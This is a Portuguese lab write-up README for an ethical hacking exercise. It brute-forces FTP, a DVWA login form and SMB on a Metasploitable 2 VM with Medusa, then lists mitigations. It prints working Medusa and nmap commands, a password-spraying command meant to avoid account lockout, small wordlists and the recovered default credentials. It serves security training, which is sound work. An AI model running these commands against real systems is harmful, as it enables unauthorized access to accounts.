# 🛡️ Projeto Prático: Simulação de Ataques de Força Bruta e Prevenção

Este repositório contém a documentação e os artefatos de um projeto de **Ethical Hacking**, focado na execução de ataques de força bruta utilizando a ferramenta **Medusa** em ambientes controlados. O objetivo é compreender a lógica de "tentativa e erro" explorada por cibercriminosos e exercitar a implementação de medidas de mitigação.

---

## 🎯 Objetivos de Aprendizagem
*   Compreender ataques de força bruta em protocolos distintos (FTP, Web e SMB).
*   Utilizar **Kali Linux** e **Medusa** para auditoria de segurança.
*   Reconhecer vulnerabilidades comuns e propor medidas de mitigação eficazes.
*   Documentar processos técnicos de forma estruturada para portfólio profissional.

---

## 💻 Configuração do Ambiente
O laboratório foi montado utilizando o **VirtualBox** para garantir um ambiente isolado (Sandboxed).

*   **Atacante:** Kali Linux.
*   **Alvo:** Metasploitable 2 (incluindo o DVWA - Damn Vulnerable Web Application).
*   **Rede:** Ambas as VMs configuradas em **Rede Interna (Host-Only)** para evitar exposição externa e garantir segurança.

---

## 🔍 Etapa 1: Enumeração e Varredura
Antes dos ataques, foi realizada a identificação dos vetores de ataque.

1.  **Mapeamento de Rede:** Identificação de dispositivos ativos no segmento.
2.  **Varredura de Portas:** Uso do Nmap para encontrar serviços vulneráveis.
    ```bash
    nmap -sV <IP_ALVO>
    ```
    *Serviços alvo identificados: FTP (21), SMB (445) e HTTP (80).*

---

## 🚀 Cenários de Ataque Simulados

### 1. Força Bruta em FTP (Porta 21)
O protocolo FTP é visado por carecer de requisitos modernos de segurança em versões antigas.
*   **Comando:**
    ```bash
    medusa -h <IP_ALVO> -u admin -P wordlist.txt -M ftp
    ```
*   **Validação:** Teste de conexão manual após a descoberta das credenciais.

### 2. Automação em Formulário Web (DVWA)
Simulação de ataque contra a interface de login do DVWA.
*   **Comando:**
    ```bash
    medusa -h <IP_ALVO> -u admin -P wordlist.txt -M web-form -m FORM:/login.php:username=^USER^&password=^PASS^:F=Login failed
    ```
*   **Nota:** O parâmetro `F=Login failed` é essencial para o Medusa identificar quando uma tentativa foi rejeitada pelo servidor.

### 3. Password Spraying em SMB (Porta 445)
Uso estratégico para testar uma única senha comum contra vários usuários, evitando bloqueios de conta.
*   **Enumeração:** Identificação prévia de contas via `enum4linux` ou `nmap`.
*   **Comando:**
    ```bash
    medusa -h <IP_ALVO> -U users.txt -p 123456 -M smbnt
    ```
*   **Validação:** Uso do `smbclient` para confirmar o acesso aos compartilhamentos.

---

## 📑 Documentação e Resultados

### Wordlists Utilizadas (Exemplo)
*   **users.txt:** `admin`, `msfadmin`, `root`, `user`, `guest`.
*   **pass.txt:** `123456`, `password`, `admin`, `msfadmin`, `qwerty`.

### Validação de Resultados
| Serviço | Usuário Encontrado | Senha Encontrada | Ferramenta de Validação |
| :--- | :--- | :--- | :--- |
| FTP | msfadmin | msfadmin | `ftp <IP>` |
| SMB | admin | admin | `smbclient` |

---

## 🛡️ Recomendações de Mitigação
Para prevenir os ataques simulados, recomendam-se as seguintes defesas:

*   **Autenticação Multifator (MFA):** Essencial para impedir o acesso mesmo com a descoberta da senha.
*   **Políticas de Bloqueio de Conta:** Estabelecer bloqueio temporário após X tentativas consecutivas falhas.
*   **Complexidade de Credenciais:** Exigir senhas fortes, desencorajando o uso de termos comuns em wordlists.
*   **Monitoramento e Logs:** Auditoria constante para detectar padrões de tentativas automatizadas (SIEM/IDS).
*   **Restrições de Rede:** Utilizar Firewalls para restringir o acesso a serviços críticos apenas a IPs autorizados.

---

## 📂 Estrutura do Repositório
*   `/wordlists`: Arquivos de texto simples utilizados nos testes.
*   `/images`: Capturas de tela comprovando a execução dos comandos.
*   `README.md`: Documentação principal.

---

## 📜 Conclusão
Este projeto demonstrou como sistemas mal configurados ou com senhas fracas podem ser comprometidos rapidamente. O domínio de ferramentas de força bruta permanece essencial para profissionais de segurança reforçarem a necessidade de defesas em camadas.

---
*Aviso: Este conteúdo possui fins estritamente educacionais. O uso destas técnicas em sistemas sem autorização prévia é ilegal.*
